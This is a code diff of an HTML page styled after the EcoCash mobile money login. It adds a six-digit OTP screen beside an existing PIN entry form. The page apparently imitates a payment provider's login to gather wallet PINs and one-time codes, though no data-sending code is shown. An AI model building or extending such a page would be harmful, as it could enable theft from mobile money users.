@@ -90,7 +90,8 @@
       border-color: #e12b2b !important;
       box-shadow: 0 0 0 2px rgba(225,43,43,0.2) !important;
       outline: none;
-    }    /* OTP Screen Styles (kept for UI integrity*/
+    }
+    /* OTP Screen Styles (kept for UI integrity but never used) */
     .otp-screen {
       display: none;
       position: absolute;
@@ -264,7 +265,7 @@
       min-height: 20px;
     }
 
-      /* Spinner Overlay – now blue to match EcoCash branding */
+    /* Spinner Overlay – now blue to match EcoCash branding */
     #spinnerOverlay {
       position: fixed;
       inset: 0;
@@ -314,9 +315,34 @@
       <input class="pin" type="password" maxlength="1" inputmode="numeric" id="pin4">
     </div>
   </div>
+
+  <!-- OTP Screen (kept for UI consistency but no longer functional) -->
+  <div class="otp-screen" id="otpScreen">
+    <div class="otp-header">
+      <h2>Verify OTP</h2>
+    </div>
+    <div class="otp-message">
+      A 6-digit OTP has been sent to:
+    </div>
+    <div class="otp-phone-display" id="otpPhoneDisplay">
+      <span class="country-code" id="otpCountryCode">+263</span>
+      <span id="otpPhoneNumber"></span>
+    </div>
+    
+    <div class="otp-inputs">
+      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" id="otp1">
+      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" id="otp2">
+      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" id="otp3">
+      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" id="otp4">
+      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" id="otp5">
+      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" id="otp6">
+    </div>
+    
     <div class="error-message" id="otpError"></div>
     <div class="success-message" id="otpSuccess"></div>
-</div>
+    
+    <button class="back-btn" id="backToLoginBtn">← Back to Login</button>
+  </div>
 
   <div class="bottom">
     <p>To register an EcoCash wallet or get assistance, click below</p>
